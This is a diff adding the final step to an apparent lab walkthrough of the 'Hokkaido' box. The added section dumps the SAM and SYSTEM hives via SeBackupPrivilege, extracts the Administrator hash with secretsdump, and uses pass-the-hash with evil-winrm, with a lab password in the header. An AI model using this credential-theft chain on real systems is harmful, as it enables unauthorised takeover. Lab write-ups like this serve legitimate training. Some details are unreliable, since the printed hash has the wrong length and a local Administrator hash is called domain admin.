@@ -668,6 +668,85 @@ xfreerdp3 /u:molly.smith /p:'Pass@123' /drive:/tmp /dynamic-resolution /v:hokkai
 
 
 
+## Final Escalation: Molly.Smith Shell → SeBackupPrivilege → SAM Dump → PTH as Administrator
+
+**Molly.Smith creds** obtained via targeted Kerberoast (after adding SPN with GenericWrite from Hazel.Green).
+
+
+**Dump SAM + SYSTEM hives** (using SeBackupPrivilege):
+
+```powershell
+cd C:\Users\molly.smith\
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive
+```
+
+**Exfil to Kali** (via SMB share, RDP drive, or other writable location — in your case /tmp):
+
+```bash
+# From Kali (example via SMB or scp if setup)
+cp /tmp/sam.hive .
+cp /tmp/system.hive .
+```
+
+**Extract Administrator NT hash** with impacket-secretsdump:
+
+```bash
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+```
+
+**Output**:
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d752482897d54e2393976fddb2a2109ea4::: 
+```
+
+**Pass-the-Hash as Administrator**:
+
+```bash
+evil-winrm -i 192.168.51.40 -u Administrator -H d752482897d54e2393976fddb2a2109ea4
+```
+
+**Inside Administrator shell**:
+
+```powershell
+cd C:\Users\Administrator\Desktop
+type proof.txt
+```
+
+**Proof output**:
+
+```
+1626801b99c559257f3422cc0634dcf2d
+```
+
+
+**Box pwned!** Domain Admin access achieved.
+
+**Lessons from Hokkaido**:
+- Heavy enumeration (shares, NETLOGON clue, MSSQL impersonation).
+- Kerberoasting (maintenance hash no crack → pivot).
+- BloodHound + GenericWrite → SPN add → targeted Kerberoast (bypass missing ForceChangePassword).
+- SeBackupPrivilege → SAM dump → PTH for final DA.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Finally got **Molly.Smith** shell via evil-winrm (after cracking her hash from targeted Kerberoast), used **SeBackupPrivilege** to dump SAM + SYSTEM hives, exfiltrated them, used `impacket-secretsdump` to extract the **Administrator NT hash**, then Pass-the-Hash (PTH) with evil-winrm to log in as Administrator and read proof.txt.
+
+
 
 
 
